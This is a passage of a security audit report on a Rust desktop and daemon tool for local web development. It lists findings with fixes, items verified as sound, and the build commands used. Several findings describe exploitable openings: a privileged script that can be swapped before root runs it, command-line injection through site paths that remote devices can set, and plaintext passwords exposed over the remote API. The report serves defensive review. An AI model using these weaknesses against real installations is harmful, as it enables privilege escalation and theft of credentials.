| P2-8 | `crates/bz-net/src/elevation.rs:209-213` | A PowerShell here-string `@'…'@` ends at any content line that starts with `'@`. The hosts file content includes user lines. | Base64-encode the content and `[Convert]::FromBase64String` it in the script. |
| P2-9 | `elevation.rs:406-409` (script written to `backups/<stamp>/elevated-N.sh`), `:274` (`pkexec /bin/sh <path>`) | TOCTOU: the script sits in a user-writable dir and is executed as root. Any same-user process can swap it between write and approval. The user approves "run /bin/sh <path>", not the content. | Pass the script on stdin (`pkexec /bin/sh -s`), or copy it into a root-owned temp dir inside the elevated command and verify its sha256 before running. Same for osascript and PowerShell. |
| P2-10 | `crates/bz-net/src/dns.rs:250-258` | `tcp.accept()` errors `continue` immediately. On EMFILE this busy-loops at 100% CPU. Per-connection tasks are unbounded. | Sleep 100 ms after an accept error. Cap concurrent TCP sessions with a Semaphore of 64. |
| P2-11 | `crates/bz-core/src/ports.rs:7-17`, `crates/bz-net/src/ports.rs:63-73` | `is_listening` and `is_free` check IPv4 only. A dev server bound to `[::1]` is invisible, so ports collide and `wait_listening` times out. | Also probe `[::1]` and `[::]`. |
| P2-12 | `runtimes.rs:717` | `dir /b /ad /on` sorts by name, so `8.10` < `8.9` and the shim picks the wrong "newest" match. | Covered by the native shim (P1-10). Otherwise sort numerically in a `for /f` loop. |
| P2-13 | `services.rs:787` (`unix/<root>/fpm.sock`), `paths.rs` | Unix socket paths are limited to 104 bytes (macOS) or 108 (Linux). A long `BOZKURT_HOME` breaks php-fpm with an obscure error. | Check the length. Fall back to `$TMPDIR/bz-<hash>/fpm.sock` (0700 dir) or `127.0.0.1:<port>`. |
| P2-14 | `crates/bz-daemon/src/instance.rs:26-33` | Windows `pid_alive` parses `tasklist` output, which is slow and locale-dependent. | `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)` + `GetExitCodeProcess == STILL_ACTIVE`. |
| P2-15 | `apps/desktop/src-tauri/src/lib.rs:370-375` | `cmd /C start cmd /K cd /d <path>`: a site path containing `&`, `^` or `%` is parsed by cmd. The path comes from the API (remote devices can set it). | Use `wt -d` only, or `Command::new("cmd").raw_arg(...)` with proper quoting, or `CREATE_NEW_CONSOLE` + `current_dir(path)`. |
| P2-16 | `supervisor.rs:352-371`, `:555-575` | Every captured line opens, appends and closes the log file synchronously inside a tokio task. Chatty dev servers cost syscalls and block a worker thread. | Use one buffered writer per process with periodic flush, running in `spawn_blocking` or through a channel to a writer task. |
| P2-17 | `supervisor.rs:276-285` | A clean exit (code 0) of a service with the default policy counts as a crash and restarts up to 10×. | Treat exit 0 as Stopped for app sites unless `restart = always`. |
| P2-18 | `crates/bz-net/src/tls.rs:252-256` | The temp name uses only the pid, so concurrent writers in one process collide. Key and cert are two separate renames, so Caddy can load a mismatched pair in between. Today this is serialized by `engine.caddy_lock`, but `ensure_cert` is public. | Use a uuid temp name. Write key and cert to a staging dir and rename the dir, or write the cert last and verify the pair before reload. |
| P2-19 | `tls.rs:368-381` | `LocalCa::ensure` silently **regenerates** the CA when the key fails to parse or the CA is within 30 days of expiry. Every trusted store then becomes stale and HTTPS breaks everywhere with no prompt. | Never regenerate silently. Surface a doctor check and a job ("CA expires in N days – renew and re-trust"). |
| P2-20 | `crates/bz-net/src/resolver.rs:160-163,263` | The systemd-resolved drop-in puts `DNS=127.0.0.1:5390` in the **global** `[Resolve]` section. Global servers also take part in non-`~tld` lookups on some setups, and REFUSED answers can cause delays or fallbacks. **(Not verified on a live systemd host.)** | Prefer `resolvectl dns`/`domain` on a dummy interface (`bozkurt0`) or a per-link drop-in. At least test `resolvectl query example.com` latency in CI. |
| P2-21 | `config.toml` `[databases.*] password` (`crates/bz-daemon/src/databases.rs:5-12`) | Stored in plain text and returned verbatim by `GET /config`, including over the remote listener. | Redact secrets in `config_json()`. Store them in the OS keychain or a 0600 file. |
| P2-22 | Remote scope (`api.rs:87-143`) | A paired phone has the same power as the local user: `PATCH /config`, app-site commands, `tls/trust`. It is effectively remote code execution by design. | Document it. Consider token scopes (read-only / control / admin) and require an on-desktop confirmation for "system" actions coming from remote. |
| P2-23 | Workspace `Cargo.toml` | No `rust-version`. The effective MSRV is **≥ 1.89** (`uuid 1.27.0` declares 1.89; `time 0.3.55`, `rcgen 0.14.10` and `hickory-* 0.26.3` declare 1.88). The code also uses `Option::is_none_or` (1.82). | Add `rust-version = "1.89"` to `[workspace.package]` and a CI job on that toolchain. |
| P2-24 | Dependencies (RustSec advisory-db, cloned 2026-10-09, matched against Cargo.lock) | **No vulnerability advisories.** Informational: `number_prefix 0.4.0` is unmaintained (RUSTSEC-2025-0119), pulled in by `indicatif 0.17`. `glib 0.18.5` is unsound (RUSTSEC-2024-0429) and `proc-macro-error 1.0.4` is unmaintained (RUSTSEC-2024-0370), both via tauri/wry on Linux (gtk3-rs stack), so upstream. | Bump `indicatif` to 0.18 (uses `unit-prefix`). Track tauri's move to gtk4/webkitgtk-6. `cargo-audit` itself was not built (memory budget); the advisory DB was matched with a script (`work/audit-rustsec.py`). |
| P2-25 | Dependency duplicates | Computed from `Cargo.lock` (no extra build). The default-member closure, dev/build dependencies included, has **17** crates in more than one version; the whole workspace with Tauri has 43. Directly actionable: `tungstenite 0.24` (bz-cli, direct) vs `0.29` (bz-daemon dev-dep `tokio-tungstenite 0.29`); `console 0.15` (via `indicatif 0.17`) vs `0.16` (via `comfy-table 7`); `rand 0.8`/`thiserror 1` only via `tungstenite 0.24`. Side effect of sharing one lockfile with the Tauri crates: `system-deps 6.2.2` (gtk stack) holds `toml` at **0.8.2** (2023) for bz-core and bz-cli too, which also drags in `toml_edit 0.20`/`winnow 0.5`. The rest (`syn 2/3`, `windows-sys 0.52/0.59/0.61`, `getrandom`, `rand_core`, `socket2` via `mdns-sd 0.13`, `base64`) is transitive. | Bump bz-cli to `tungstenite 0.29` (same as the dev-dep) and `indicatif 0.18`. Move `toml` to 0.9 or 1.x in `[workspace.dependencies]`, or move the Tauri apps to their own workspace or lockfile so the gtk3 pins stop constraining the core crates. Upgrade `mdns-sd` to a release on `socket2 0.6`. Add `cargo deny check bans` (warn on duplicates) to CI. |
| P2-26 | `[profile.release]` | `lto = true`, `codegen-units = 1`, `strip = true` is fine for size. `strip = true` removes all symbols, so crash backtraces from users are useless. `panic` is unwind, which is correct (axum/tokio isolate handler panics). | `strip = "debuginfo"` (keeps symbol names) or split-debuginfo artefacts uploaded per release. Consider `lto = "thin"` to halve CI time with little size cost. |
| P2-27 | `apps/desktop/src-tauri/STUB.md` | It says "Placeholder … delete this STUB.md", but the crate is real (538-line `lib.rs`). Sidecar staging itself is handled: `ci.yml:111-117` stubs `binaries/bozkurtd-<triple>` and `release.yml:144` stages the real binary for `tauri.sidecar.conf.json`. | Delete STUB.md. |

---

## 7. Items checked and found OK
These need no action. They are listed so the fixer does not re-audit them.
- **Remote auth:**
  - Every route except `OPTIONS` and `POST /api/v1/remote/pair` requires a token (`api.rs:183-214`).
  - Token comparison is constant time on SHA-256 hashes (`remote.rs:117-119,243-249`).
  - Tokens are stored only as hashes.
  - Pairing codes are single use, have a 5-minute TTL, and use uniform rejection sampling.
  - `pairing-code` is local-only and `pair` is remote-only.
- **Elevation scripts:**
  - `sh_quote` and `ps_quote` are correct for POSIX and PowerShell single-quoted strings.
  - The TLD is strictly validated (`resolver.rs:132-148`) before it reaches NRPT, PowerShell or `/etc/resolver`.
  - Heredoc delimiters are collision-checked.
  - `osascript` escaping is correct.
  - Backups go to `backups/<stamp>/<abs path>`.
- **Domains** (`sites.rs:22-55`): RFC-ish labels only, so domains and aliases cannot inject into the Caddyfile host lines (`caddyfile.rs:165`).
- **Site ids** are slugified, so they are safe in snippet names and log file names.
- **Database names** are restricted to `[A-Za-z0-9_-]{1,64}` and quoted with backticks or double quotes (`databases.rs:38-50`). System DBs are protected. The password goes through the `MYSQL_PWD`/`PGPASSWORD` env, not argv. The clients run with `--no-defaults`.
- **Bundled services** bind 127.0.0.1 only (MariaDB `--bind-address`, Postgres `-h 127.0.0.1`, Redis `--bind`, Mailpit `--smtp/--listen 127.0.0.1`).
- **Archive extraction:**
  - Tar uses `unpack_in`, which rejects escapes.
  - Zip uses `enclosed_name`.
  - Staging plus atomic rename, with the old tree swapped aside and rolled back on failure.
- **`state.json`, Caddyfile and shims** are written with temp + fsync + rename. A corrupt `state.json` is moved aside, not lost.
- **Runtime uninstall** rejects `/`, `\`, a leading `.` and empty versions (`runtimes.rs:435-445`), so there is no path traversal through `DELETE /runtimes/{kind}/{version}`.
- **Composer phar** is verified against getcomposer.org's sha256. Node uses SHASUMS256. Windows PHP, Go, Bun and Python use index sha256 or GitHub `digest`, as long as the index provides it (see P1-1 for the fallback).
- **Caddy reloads** are serialized (`engine.rs:878` `caddy_lock`).

---

## 8. How the checks were run (reproducible)
```sh
# memory-safe settings used throughout
export CARGO_BUILD_JOBS=1 CARGO_PROFILE_DEV_DEBUG=0 CARGO_TARGET_DIR=$PWD/../work/target-audit
rustup target add x86_64-pc-windows-gnu x86_64-apple-darwin
sudo apt-get install -y gcc-mingw-w64-x86-64
CC_x86_64_pc_windows_gnu=x86_64-w64-mingw32-gcc cargo check --target x86_64-pc-windows-gnu --all-targets
# macOS: Rust type-check only; C deps satisfied by work/fakecc/cc (see §1.2)
CC_x86_64_apple_darwin=$PWD/../work/fakecc/cc AR_x86_64_apple_darwin=ar cargo check --target x86_64-apple-darwin --all-targets
sudo apt-get install -y libwebkit2gtk-4.1-dev libgtk-3-dev librsvg2-dev libayatana-appindicator3-dev
cargo check -p bozkurt-desktop
python3 work/audit-rustsec.py Cargo.lock      # against a shallow clone of rustsec/advisory-db
python3 (Cargo.lock graph walk, see P2-25) instead of cargo tree -d
```
